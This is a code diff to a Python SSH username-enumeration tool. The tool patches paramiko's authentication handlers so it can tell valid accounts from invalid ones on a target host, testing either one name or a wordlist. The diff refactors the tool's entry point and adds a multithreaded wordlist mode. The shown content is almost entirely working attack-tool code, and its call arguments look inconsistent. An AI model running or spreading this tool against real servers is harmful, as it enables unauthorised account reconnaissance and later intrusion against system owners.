@@ -10,15 +10,6 @@ import socket
 import sys
 import pdb
 
-arg_parser = argparse.ArgumentParser()
-arg_parser.add_argument('-t',dest='hostname', type=str, help='Single target')
-arg_parser.add_argument('-p',dest='port', type=int, default=22, help='port to connect on: Default port is 22')
-arg_parser.add_argument('-u',dest='username', type=str, help='username you want to enumerate')
-arg_parser.add_argument('-w',dest='wordlist', help='enumerate multiple users')
-args = arg_parser.parse_args()
-port = args.port
-target = args.hostname
-
 class InvalidUsername(Exception):
     pass
 
@@ -59,23 +50,34 @@ def _paramiko_tunnel(username, *args, **kwargs):
         print ('[+] {} - Valid username'.format(us))
         return
 
+if __name__ == "__main__":
 
-paramiko.auth_handler.AuthHandler._client_handler_table.update({
-    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
-    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
-})
+    arg_parser = argparse.ArgumentParser()
+    arg_parser.add_argument('-H',dest='hostname', type=str, help='Single target')
+    arg_parser.add_argument('-t',dest='threads', type=int, help='Number of threads', default=10)
+    arg_parser.add_argument('-p',dest='port', type=int, default=22, help='port to connect on: Default port is 22')
+    arg_parser.add_argument('-u',dest='username', type=str, help='username you want to enumerate')
+    arg_parser.add_argument('-w',dest='wordlist', help='enumerate multiple users')
+    args = arg_parser.parse_args()
+    port = args.port
+    target = args.hostname
 
-logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
+    paramiko.auth_handler.AuthHandler._client_handler_table.update({
+        paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
+        paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
+    })
 
-if args.username is not None:
-    username = args.username
-    _paramiko_tunnel(target, port, username)
+    logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
 
-if args.wordlist is not None:
-    usernames = []
-    mp = []
-    pool = multiprocessing.Pool(5)
-    with open(args.wordlist) as f:
-        for u in f:
-            usernames.append(u)
-        pool.map(_paramiko_tunnel, usernames)
+    if args.username is not None:
+        username = args.username
+        _paramiko_tunnel(target, port, username)
+
+    if args.wordlist is not None:
+        usernames = []
+        mp = []
+        pool = multiprocessing.Pool(args.threads)
+        with open(args.wordlist) as f:
+            for u in f:
+                usernames.append(u)
+            pool.map(_paramiko_tunnel, usernames)
